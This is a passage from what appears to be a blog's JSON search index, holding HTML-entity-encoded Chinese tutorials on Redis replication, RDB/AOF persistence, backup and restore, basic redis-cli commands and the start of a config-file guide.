FF08;&#x78C1;&#x76D8;&#xFF09;&#xFF0C;&#x800C;&#x540E;&#x628A;&#x8BE5;&#x6587;&#x52A0;&#x88C5;&#x8F7D;&#x5230;&#x5185;&#x5B58;&#x4E2D;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x91CD;&#x5EFA;&#xFF0C;&#x94FE;&#x5F0F;&#x590D;&#x5236;&#x4E5F;&#x540C;&#x6B65;&#x5982;&#x6B64;&#xFF0C;&#x56E0;&#x4E3A;&#x4E3B;&#x662F;&#x4E0D;&#x533A;&#x5206;&#x662F;&#x771F;&#x6B63;&#x7684;&#x4E3B;&#xFF0C;&#x8FD8;&#x662F;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x7684;&#x4ECE;&#x3002; 1. &#x542F;&#x52A8;slave 2. slave&#x4F1A;&#x5411;master&#x53D1;&#x9001;&#x540C;&#x6B65;&#x547D;&#x4EE4;&#xFF0C;&#x8BF7;&#x6C42;&#x4E3B;&#x5E93;&#x4E0A;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x4E0D;&#x8BBA;&#x4ECE;&#x670D;&#x52A1;&#x7AEF;&#x662F;&#x5426;&#x662F;&#x7B2C;&#x4E00;&#x6B21;&#x8FDE;&#x63A5;&#xFF0C;master&#x6B64;&#x65F6;&#x90FD;&#x4F1A;&#x542F;&#x52A8;&#x4E00;&#x4E2A;&#x540E;&#x53F0;&#x7684;&#x5B50;&#x8FDB;&#x7A0B;&#x5C06;&#x6570;&#x636E;&#x5FEB;&#x7167;&#x4FDD;&#x5B58;&#x5728;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x53D1;&#x9001;&#x7ED9;slave 3. salve&#x6536;&#x5230;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x4EE5;&#x540E;&#xFF0C;&#x4F1A;&#x4FDD;&#x5B58;&#x5230;&#x672C;&#x5730;&#xFF0C;&#x800C;&#x540E;&#x628A;&#x6587;&#x4EF6;&#x91CD;&#x8F7D;&#x88C5;&#x5165;&#x5185;&#x5B58; &#x7279;&#x70B9;1&#x3001; &#x4E00;&#x4E2A;Master&#x53EF;&#x4EE5;&#x6709;&#x591A;&#x4E2A;slave&#xFF1B;2&#x3001; &#x652F;&#x6301;&#x94FE;&#x5F0F;&#x590D;&#x5236;&#xFF08;&#x4E00;&#x4E2A;slave&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x5176;&#x4ED6;&#x7684;slave&#x7684;slave&#xFF09;&#xFF1B;3&#x3001; Master&#x4EE5;&#x975E;&#x963B;&#x585E;&#x65B9;&#x5F0F;&#x540C;&#x6B65;&#x6570;&#x636E;&#x81F3;slave&#xFF08;master&#x53EF;&#x4EE5;&#x540C;&#x65F6;&#x5904;&#x7406;&#x591A;&#x4E2A;slave&#x7684;&#x8BFB;&#x5199;&#x8BF7;&#x6C42;&#xFF0C;slave&#x7AEF;&#x5728;&#x540C;&#x6B65;&#x6570;&#x636E;&#x65F6;&#x4E5F;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x975E;&#x963B;&#x585E;&#x65B9;&#x5F0F;&#xFF09; &#x542F;&#x7528;&#x590D;&#x5236;&#x529F;&#x80FD;Slave vim redis.conf 1slaveof Redis&#x4E3B;&#x670D;&#x52A1;&#x5668;IP&#x5730;&#x5740; &#x7AEF;&#x53E3; &#x91CD;&#x542F;redis sentinel&#x5B9E;&#x73B0;&#x4E3B;&#x4ECE;&#x67B6;&#x6784;&#x9AD8;&#x53EF;&#x7528; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis持久化","date":"2022-06-07T04:49:38.000Z","path":"/posts/119ed1dc/","text":"Redis&#x6301;&#x4E45;&#x5316;&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Redis&#x5DE5;&#x4F5C;&#x65F6;&#x6240;&#x6709;&#x6570;&#x636E;&#x90FD;&#x96C6;&#x90FD;&#x662F;&#x5B58;&#x50A8;&#x4E0E;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#xFF0C;&#x4E0D;&#x8BBA;&#x662F;&#x5426;&#x6709;&#x78C1;&#x76D8;&#x4E0A;&#x7684;&#x6301;&#x4E45;&#x5316;&#x6570;&#x636E;&#xFF0C;&#x90FD;&#x662F;&#x5DE5;&#x4F5C;&#x4E8E;&#x5185;&#x5B58;&#x5F53;&#x4E2D;&#xFF0C;redis&#x672C;&#x8EAB;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x5185;&#x5B58;&#x7684;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x628A;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x76F8;&#x5173;&#x7684;&#x5B58;&#x50A8;&#x90FD;&#x5B58;&#x50A8;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x5982;&#x679C;redis&#x5D29;&#x6E83;&#x6216;&#x65AD;&#x7535;&#x5BFC;&#x81F4;&#x6240;&#x6709;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x6240;&#x4EE5;redis&#x63D0;&#x4F9B;&#x4E86;&#x6301;&#x4E45;&#x5316;&#x529F;&#x80FD;&#x6765;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x53EF;&#x9760;&#x6027;&#xFF0C;redis&#x6301;&#x4E45;&#x5316;&#x6709;&#x4E24;&#x79CD;&#x5B9E;&#x73B0;&#x65B9;&#x5F0F;&#x3002;RDB&#x548C;AOF RDBRDB&#x5B58;&#x50A8;&#x4E3A;&#x4E8C;&#x8FDB;&#x5236;&#x683C;&#x5F0F;&#x7684;&#x6570;&#x636E;&#x6587;&#x4EF6;&#xFF0C;&#x9ED8;&#x8BA4;&#x542F;&#x52A8;&#x7684;&#x6301;&#x4E45;&#x5316;&#x673A;&#x5236;&#xFF0C;&#x6309;&#x4E8B;&#x5148;&#x6307;&#x5B9A;&#x7684;&#x7B56;&#x7565;&#xFF0C;&#x5468;&#x671F;&#x6027;&#x5730;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x5B58;&#x81F3;&#x78C1;&#x76D8;&#xFF0C;&#x4F7F;&#x7528;save&#x547D;&#x4EE4;&#x5373;&#x53EF;&#x8BBE;&#x5B9A;&#x5468;&#x671F;&#x548C;&#x7B56;&#x7565;&#x5373;&#x53EF;&#xFF1B;&#x6570;&#x636E;&#x6587;&#x4EF6;&#x9ED8;&#x8BA4;&#x4E3A;dump.rdb&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668;&#x53EF;&#x4EE5;&#x7528;save&#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#x81F3;&#x6570;&#x636E;&#x81F3;&#x78C1;&#x76D8;&#x3002; &#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x6709;&#x4E24;&#x79CD;&#x65B9;&#x5F0F; 1&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x4E5F;&#x53EF;&#x663E;&#x5F0F;&#x4F7F;&#x7528;SAVE&#x548C;BGSAVE&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x5FEB;&#x7167;&#x4FDD;&#x5B58;&#x673A;&#x5236;&#xFF1B;2&#x3001;&#x501F;&#x52A9;&#x4E8E;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x6240;&#x5B9A;&#x4E49;&#x7684;save&#x548C;&#x7B56;&#x7565;&#x8FDB;&#x884C;&#x4FDD;&#x5B58;&#xFF1B; SAVE&#xFF1A; &#x662F;&#x540C;&#x6B65;&#x4FDD;&#x5B58;&#xFF0C;&#x5728;&#x5BA2;&#x6237;&#x7AEF;&#x4F7F;&#x7528;save&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x65F6;&#xFF0C;&#x662F;&#x5728;redis&#x4E3B;&#x7EBF;&#x7A0B;&#x4E2D;&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#xFF1B;&#x56E0;&#x4E3A;redis&#x7684;&#x4E3B;&#x7EBF;&#x7A0B;&#x662F;&#x7528;&#x4E8E;&#x5904;&#x7406;&#x8BF7;&#x6C42;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x6B64;&#x65F6;&#x4F1A;&#x963B;&#x585E;&#x6240;&#x6709;&#x5BA2;&#x6237;&#x7AEF;&#x8BF7;&#x6C42;&#xFF0C;&#x6BCF;&#x6B21;&#x7684;&#x4FDD;&#x5B58;&#x5FEB;&#x7167;&#x90FD;&#x662F;&#x628A;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x5B8C;&#x6574;&#x7684;&#x4FDD;&#x5B58;&#x4E00;&#x4EFD;&#xFF0C;&#x5E76;&#x975E;&#x662F;&#x589E;&#x91CF;&#x7684;&#xFF0C;&#x5982;&#x679C;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x6BD4;&#x8F83;&#x5927;&#xFF0C;&#x800C;&#x8FD8;&#x6709;&#x5927;&#x91CF;&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x6B64;&#x65B9;&#x5F0F;&#x4F1A;&#x5F15;&#x8D77;&#x5927;&#x91CF;&#x7684;I/O&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;redis&#x6027;&#x80FD;&#x4E0B;&#x964D; BGSAVE&#xFF1A; &#x5F02;&#x6B65;&#x65B9;&#x5F0F;&#xFF0C;&#x5C06;&#x7ACB;&#x5373;&#x8FD4;&#x56DE;&#x7ED3;&#x679C;&#xFF0C;&#x4F46;&#x81EA;&#x52A8;&#x5728;&#x540E;&#x53F0;&#x4FDD;&#x6301;&#x64CD;&#x4F5C;&#xFF0C;&#x6240;&#x4EE5;BGSAVE&#x547D;&#x4EE4;&#x542F;&#x52A8;&#x4EE5;&#x540E;&#xFF0C;&#x524D;&#x53F0;&#x4E0D;&#x4F1A;&#x88AB;&#x5360;&#x7528;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x7684;&#x8BF7;&#x6C42;&#x662F;&#x4E0D;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#xFF08;&#x4E3B;&#x8FDB;&#x7A0B;&#x4E0D;&#x4F1A;&#x88AB;&#x963B;&#x585E;&#xFF09; &#x5982;&#x679C;&#x662F;&#x5728;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x4E2D;&#x5B9A;&#x4E49;&#x7684;save&#xFF0C;&#x90A3;&#x4E48;redis&#x5728;&#x6301;&#x4E45;&#x5316;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5219;&#x4F1A;&#x5F00;&#x542F;&#x53E6;&#x5916;&#x7684;&#x8FDB;&#x7A0B;&#x53BB;&#x5904;&#x7406;&#xFF0C;&#x4E0D;&#x4F1A;&#x963B;&#x585E;redis&#x7684;&#x4E3B;&#x8FDB;&#x7A0B; RDB&#x6301;&#x4E45;&#x5316;&#x4E0D;&#x8DB3;&#x4E4B;&#x5904;&#x5219;&#x662F;&#xFF0C;&#x4E00;&#x65E6;&#x6570;&#x636E;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#xFF0C;&#x7531;&#x4E8E;RDB&#x7684;&#x6570;&#x636E;&#x4E0D;&#x662F;&#x6700;&#x65B0;&#x7684;&#xFF0C;&#x6240;&#x4EE5;&#x57FA;&#x4E8E;RDB&#x6062;&#x590D;&#x8FC7;&#x6765;&#x7684;&#x6570;&#x636E;&#x4E00;&#x5B9A;&#x4F1A;&#x6709;&#x4E00;&#x90E8;&#x5206;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;RDB&#x4FDD;&#x5B58;&#x4E4B;&#x540E;&#x7684;&#x4FEE;&#x6539;&#x6570;&#x636E;&#x4F1A;&#x4E22;&#x5931;&#x3002; AOFAOF&#xFF1A; Append Only File&#xFF0C;&#x6709;&#x7740;&#x66F4;&#x597D;&#x7684;&#x6301;&#x4E45;&#x5316;&#x80FD;&#x529B;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;AOF&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x8BB0;&#x5F55;&#x6BCF;&#x4E00;&#x6B21;Redis&#x7684;&#x5199;&#x64CD;&#x4F5C;&#x547D;&#x4EE4;&#xFF0C;&#x4EE5;&#x987A;&#x5E8F;IO&#x65B9;&#x5F0F;&#x9644;&#x52A0;&#x5728;&#x6307;&#x5B9A;&#x6587;&#x4EF6;&#x7684;&#x5C3E;&#x90E8;&#xFF0C;&#x662F;&#x4F7F;&#x7528;&#x8FFD;&#x52A0;&#x65B9;&#x5F0F;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x8FD9;&#x4E5F;&#x53EB;&#x505A;&#x4E00;&#x79CD;&#x9644;&#x52A0;&#x65E5;&#x5FD7;&#x7C7B;&#x578B;&#x7684;&#x6301;&#x4E45;&#x5316;&#x673A;&#x5236;&#xFF0C;&#x7531;&#x4E8E;&#x6BCF;&#x4E00;&#x6B21;&#x7684;&#x64CD;&#x7EB5;&#x90FD;&#x8BB0;&#x5F55;&#xFF0C;&#x5219;&#x4F1A;&#x968F;&#x7740;&#x65F6;&#x95F4;&#x589E;&#x957F;&#x800C;&#x589E;&#x5927;&#x6587;&#x4EF6;&#x7684;&#x5BB9;&#x91CF;&#xFF0C;&#x5E76;&#x4E14;&#x6709;&#x4E9B;&#x8BB0;&#x5F55;&#x7684;&#x547D;&#x4EE4;&#x662F;&#x591A;&#x4F59;&#x7684;&#xFF0C;AOF&#x4E0D;&#x50CF;RDB&#xFF0C;RDB&#x662F;&#x4FDD;&#x5B58;&#x6570;&#x636E;&#x96C6;&#x7684;&#x672C;&#x8EAB; &#x4F46;&#x662F;Redis&#x8FDB;&#x7A0B;&#x80FD;&#x591F;&#x81EA;&#x52A8;&#x7684;&#x53BB;&#x626B;&#x63CF;&#x8FD9;&#x4E2A;&#x5BF9;&#x5E94;&#x7684;AOF&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x5176;&#x4E2D;&#x4E00;&#x4E9B;&#x5197;&#x4F59;&#x7684;&#x64CD;&#x4F5C;&#x7ED9;&#x5408;&#x5E76;&#x6210;&#x4E00;&#x4E2A;&#xFF0C;&#x4EE5;&#x5B9E;&#x73B0;&#x5C06;&#x6765;&#x4E00;&#x6B21;&#x6027;&#x628A;&#x6570;&#x636E;&#x6062;&#x590D;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;Redis&#x80FD;&#x591F;&#x5408;&#x5E76;&#x91CD;&#x5199;AOF&#x7684;&#x6301;&#x4E45;&#x5316;&#x6587;&#x4EF6;&#xFF0C;&#x7531;BGREWRITEAOF&#x547D;&#x4EE4;&#x6765;&#x5B9E;&#x73B0;&#xFF0C;BGREWIRTEAOF&#x547D;&#x4EE4;&#x662F;&#x5DE5;&#x4F5C;&#x4E8E;&#x540E;&#x53F0;&#x7684;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x91CD;&#x5199;&#x540E;Redis&#x5C06;&#x4F1A;&#x4EE5;&#x5FEB;&#x7167;&#x7684;&#x65B9;&#x5F0F;&#x5C06;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4EE5;&#x547D;&#x4EE4;&#x65B9;&#x5F0F;&#x4FDD;&#x5B58;&#x5728;&#x4E34;&#x65F6;&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x66FF;&#x6362;&#x539F;&#x6765;&#x7684;&#x6587;&#x4EF6;&#xFF0C;&#x91CD;&#x5199;AOF&#x6587;&#x4EF6;&#x65B9;&#x5F0F;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x8BFB;&#x53D6;&#x65E7;AOF&#x6587;&#x4EF6;&#xFF0C;&#x800C;&#x662F;&#x76F4;&#x63A5;&#x5C06;&#x5F53;&#x524D;&#x5185;&#x5B58;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x76F4;&#x63A5;&#x751F;&#x6210;&#x4E00;&#x4E2A;&#x7C7B;&#x4F3C;&#x4E8E;MySQL&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x547D;&#x4EE4;&#x4E00;&#x6837;&#x7684;&#x64CD;&#x4F5C;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis的数据备份与恢复","date":"2022-06-07T04:49:33.000Z","path":"/posts/e3fb0a3e/","text":"Redis&#x7684;&#x6570;&#x636E;&#x5907;&#x4EFD;&#x4E0E;&#x6062;&#x590D;Linux &#x542F;&#x52A8;Redis &#x8FDB;&#x5165;Redis&#x76EE;&#x5F55; redis-cli &#x6570;&#x636E;&#x5907;&#x4EFD; SAVE &#x8BE5;&#x547D;&#x4EE4;&#x5C06;&#x5728;redis&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E2D;&#x521B;&#x5EFA;dump.rdb&#x6587;&#x4EF6;&#x3002; &#x6062;&#x590D;&#x6570;&#x636E; config get dir &#x4EE5;&#x4E0A;&#x547D;&#x4EE4;config get dir&#x8F93;&#x51FA;&#x7684;redis&#x5907;&#x4EFD;&#x76EE;&#x5F55;&#x4E3A;/usr/local/redis/bin &#x505C;&#x6B62;Redis&#x670D;&#x52A1; &#x62F7;&#x8D1D;&#x5907;&#x4EFD;&#x6587;&#x4EF6;&#x5230;/usr/local/redis/bin&#x76EE;&#x5F55;&#x4E0B; &#x91CD;&#x542F;redis Windowsredis-server --service-install redis.windows.conf redis-server --service-start redis-server --service-stop &#x5B9E;&#x6218;&#x7814;&#x7A76;SAVErm -rf /var/lib/redis/* redis-cli flushdb set jaking 666 get jaking save quit ls /var/lib/redis/ redis-cli get jaking del jaking get jaking quit ls /var/lib/redis/ systemctl restart redis redis-cli get jaking BGSAVErm -rf /var/lib/redis/* redis-cli flushdb set jaking 666 get jaking bgsave quit ls /var/lib/redis/ redis-cli get jaking del jaking get jaking quit ls /var/lib/redis/ systemctl restart redis redis-cli get jaking BGREWRITEAOFrm -rf /var/lib/redis/* redis-cli set jaking 666 bgrewirteaof quit ls /var/lib/redis/ sz /var/lib/redis/appendonly.aof redis-cli get jaking del jaking get jaking quit systemctl restart redis redis-cli get jaking quit &#x601D;&#x8003;&#xFF1A;&#x4E3A;&#x4EC0;&#x4E48;&#x4E0D;&#x80FD;&#x6062;&#x590D;&#x6570;&#x636E;&#xFF1F; rdb&#x662F;&#x5FEB;&#x7167;&#xFF0C;&#x5B9A;&#x671F;&#x628A;redis&#x5185;&#x5B58;&#x6570;&#x636E;&#x5237;&#x5230;dump.rdb aof&#x662F;&#x8BB0;&#x5F55;&#x547D;&#x4EE4; &#x4E3B;&#x52A8;&#x5220;&#x9664;&#xFF0C;&#x4E0D;&#x80FD;&#x6062;&#x590D;&#xFF01;&#x9664;&#x975E;&#x662F;redis&#x5F02;&#x5E38;&#x3001;&#x91CD;&#x88C5;&#x3001;&#x8FC1;&#x79FB;&#x624D;&#x80FD;&#x6062;&#x590D;&#xFF01; RDB&#x8FC1;&#x79FB;&#x6570;&#x636E; rpm -ivh redis-5.0.11-1.el7.remi.x86_64.rpm systemctl start redis rm -rf /var/lib/redis/* cd /var/lib/redis rz redis-cli get jaking AOF redis-cli set abc 123 get abc bgrewriteaof quit ls sz appendonly.aof &#x8FC1;&#x79FB;&#x6570;&#x636E; cat /etc/redis.conf chown redis.redis appendonly.aof document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis基本操作","date":"2022-06-07T04:49:20.000Z","path":"/posts/49fbbc1/","text":"Redis&#x57FA;&#x672C;&#x64CD;&#x4F5C;123456789101112131415[root@ctos7mini ~]&amp; redis-cli -hredis-cli 3.2.5Usage: redis-cli [OPTIONS] [cmd [arg [arg ...]]] -h &lt;hostname&gt; &#x6307;&#x5B9A;&#x4E3B;&#x673A;IP (default: 127.0.0.1). -p &lt;port&gt; &#x6307;&#x5B9A;&#x7AEF;&#x53E3;socket&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x901A;&#x4FE1; (default: 6379). -s &lt;socket&gt; &#x6307;&#x5B9A;socket&#x6587;&#x4EF6;&#xFF0C;&#x5982;&#x679C;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x7AEF;&#x90FD;&#x5728;&#x540C;&#x4E00;&#x53F0;&#x4E3B;&#x673A;&#xFF0C;&#x53EF;&#x4EE5;&#x6307;&#x5B9A;socket&#x6587;&#x4EF6;&#x8FDB;&#x884C;&#x901A;&#x4FE1; -a &lt;password&gt; &#x6307;&#x5B9A;&#x8BA4;&#x8BC1;&#x5BC6;&#x7801;. -r &lt;repeat&gt; &#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x6307;&#x5B9A;&#x8FD0;&#x884C;&#x7684;&#x547D;&#x4EE4;N&#x6B21;. -i &lt;interval&gt; &#x8FDE;&#x63A5;&#x6210;&#x529F;&#x540E;&#x6BCF;&#x4E2A;&#x547D;&#x4EE4;&#x6267;&#x884C;&#x5B8C;&#x6210;&#x7B49;&#x5F85;&#x65F6;&#x95F4;&#xFF0C;&#x4F7F;&#x7528;-i&#x9009;&#x9879;&#x6307;&#x5B9A;. -n &lt;db&gt; Database number........................&#x7701;&#x7565;...........................................[root@ctos7mini ~]&amp; &#x767B;&#x5F55;Redis1234567[root@ctos7mini ~]&amp; redis-cli127.0.0.1:6379&gt; exit[root@ctos7mini ~]&amp;&#x6216;&#x8005;[root@ctos7mini ~]&amp; redis-cli -h 127.0.0.1127.0.0.1:6379&gt; &#x83B7;&#x53D6;Redis&#x5E2E;&#x52A9;123456789101112131415161718192021222324252627282930313233127.0.0.1:6379&gt; helpredis-cli 3.2.5To get help about Redis commands type: &quot;help @&lt;group&gt;&quot; to get a list of commands in &lt;group&gt; &quot;help &lt;command&gt;&quot; for help on &lt;command&gt; &quot;help &lt;tab&gt;&quot; to get a list of possible help topics &quot;quit&quot; to exitTo set redis-cli perferences: &quot;:set hints&quot; enable online hints &quot;:set nohints&quot; disable online hintsSet your preferences in ~/.redisclirc127.0.0.1:6379&gt;&#x6216;&#x8005;,&#x83B7;&#x53D6;&#x6307;&#x5B9A;&#x6570;&#x636E;&#x7ED3;&#x6784;&#x7684;&#x5E2E;&#x52A9;127.0.0.1:6379&gt; help @string APPEND key value summary: Append a value to a key since: 2.0.0 BITCOUNT key [start end] summary: Count set bits in a string since: 2.6.0 BITFIELD key [GET type offset] [SET type offset value] [INCRBY type offset increment] [OVERFLOW WRAP|SAT|FAIL] summary: Perform arbitrary bitfield integer operations on strings since: 3.2.0 BITOP operation destkey key [key ...] summary: Perform bitwise operations between strings since: 2.6.0 .......................................................&#x7701;&#x7565;............................................................... &#x83B7;&#x53D6;&#x5355;&#x4E2A;&#x547D;&#x4EE4;&#x7684;&#x4F7F;&#x7528;&#x65B9;&#x6CD5;12345678127.0.0.1:6379&gt; help APPEND APPEND key value //&#x547D;&#x4EE4;&#x65B9;&#x6CD5; summary: Append a value to a key since: 2.0.0 //&#x8BF4;&#x660E;&#x6B64;&#x547D;&#x4EE4;&#x5728;&#x54EA;&#x4E2A;&#x7248;&#x672C;&#x4E2D;&#x5F15;&#x5165;&#x7684; group: string //&#x8BE5;&#x547D;&#x4EE4;&#x6240;&#x5C5E;&#x54EA;&#x4E00;&#x4E2A;&#x7EC4;127.0.0.1:6379&gt; &#x5E26;@&#x7684;&#x4E3A;&#x7EC4;&#xFF0C;&#x4E0D;&#x5E26;&#x5219;&#x4E3A;&#x547D;&#x4EE4; &#x5207;&#x6362;&#x5E93;&#xFF08;&#x540D;&#x79F0;&#x7A7A;&#x95F4;&#xFF09;&#xFF1A;123127.0.0.1:6379&gt; select 1 --&#x8868;&#x793A;&#x5207;&#x6362;&#x5230;1&#x53F7;&#x5E93;&#x4E2D;&#xFF0C;&#x9ED8;&#x8BA4;&#x4E3A;0&#x53F7;&#x5E93;&#xFF0C;&#x5171;16&#x4E2A;&#xFF0C;0-15OK127.0.0.1:6379[1]&gt; set12345678910111213141516171819202122232425262728127.0.0.1:6379&gt; help set SET key value [EX seconds] [PX milliseconds] [NX|XX] -- &#x547D;&#x4EE4; &#x952E; &#x503C; [EX&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#xFF0C;&#x5355;&#x4F4D;&#x79D2;s] summary: Set the string value of a key since: 1.0.0 group: string127.0.0.1:6379&gt;-- NX &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x952E;&#x4E0D;&#x5B58;&#x5728;&#xFF0C;&#x624D;&#x521B;&#x5EFA;&#x5E76;&#x8BBE;&#x5B9A;&#x503C;&#xFF0C;&#x5426;&#x5219;&#x4E0D;&#x5141;&#x8BB8;&#x8BBE;&#x5B9A;-- XX &#x5982;&#x679C;&#x4E00;&#x4E2A;&#x952E;&#x5B58;&#x5728;&#x5219;&#x8BBE;&#x7F6E;&#x952E;&#x7684;&#x503C;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x5B58;&#x5728;&#x5219;&#x4E0D;&#x521B;&#x5EFA;&#x5E76;&#x4E0D;&#x8BBE;&#x7F6E;&#x5176;&#x503C;-- &#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x952E;&#x5E76;&#x8BBE;&#x7F6E;&#x8FC7;&#x671F;&#x65F6;&#x95F4;&#x4E3A;10&#x79D2;127.0.0.1:6379&gt; set value_1 404 EX 10OK127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1&quot;404&quot;127.0.0.1:6379&gt; get value_1(nil)127.0.0.1:6379&gt; &#x83B7;&#x53D6;&#x952E;&#x4E2D;&#x7684;&#x503C;12345678127.0.0.1:6379&gt; help get GET key summary: Get the value of a key since: 1.0.0 group: string127.0.0.1:6379&gt; &#x6DFB;&#x52A0;&#x952E;&#x4E2D;&#x7684;&#x503C;123456789101112131415127.0.0.1:6379&gt; help append APPEND key value summary: Append a value to a key since: 2.0.0 group: string127.0.0.1:6379&gt;127.0.0.1:6379&gt; append value_1 502(integer) 3127.0.0.1:6379&gt; get value_1&quot;502&quot;127.0.0.1:6379&gt; &#x83B7;&#x53D6;&#x503C;&#x7684;&#x5B57;&#x7B26;&#x4E32;&#x957F;&#x5EA6;123456789101112127.0.0.1:6379&gt; help strlen STRLEN key summary: Get the length of the value stored in a key since: 2.2.0 group: string127.0.0.1:6379&gt;127.0.0.1:6379&gt; strlen value_1(integer) 3127.0.0.1:6379&gt; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });","tags":[]},{"title":"Redis配置文件详解","date":"2022-06-07T04:49:09.000Z","path":"/posts/f03da4e7/","text":"Redis&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x8BE6;&#x89E3;/etc/redis.conf 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831841851861871881891901911921931941951961971981992002012022032042052062072082092102112122132142152162172182192202212222232242252262272282292302312322332342352362372382392402412422432442452462472482492502512522532542552562572582592602612622632642652662672682692702712722732742752762772782792802812822832842852862872882892902912922932942952962972982993003013023033043053063073083093103113123133143153163173183193203213223233243253263273283293303313323333343353363373383393403413423433443453463473483493503513523533543553563573583593603613623633643653663673683693703713723733743753763773783793803813823833843853863873883893903913923933943953963973983994004014024034044054064074084094104114124134144154164174184194204214224234244254264274284294304314324334344354364374384394404414424434444454464474484494504514524534544554564574584594604614624634644654664674684694704714724734744754764774784794804814824834844854864874884894904914924934944954964974984995005015025035045055065075085095105115125135145155165175185195205215225235245255265275285295305315325335345355365375385395405415425435445455465475485495505515525535545555565575585595605615625635645655665675685695705715725735745755765775785795805815825835845855865875885895905915925935945955965975985996006016026036046056066076086096106116126136146156166176186196206216226236246256266276286296306316326336346356366376386396406416426436446456466476486496506516526536546556566576586596606616626636646656666676686696706716726736746756766776786796806816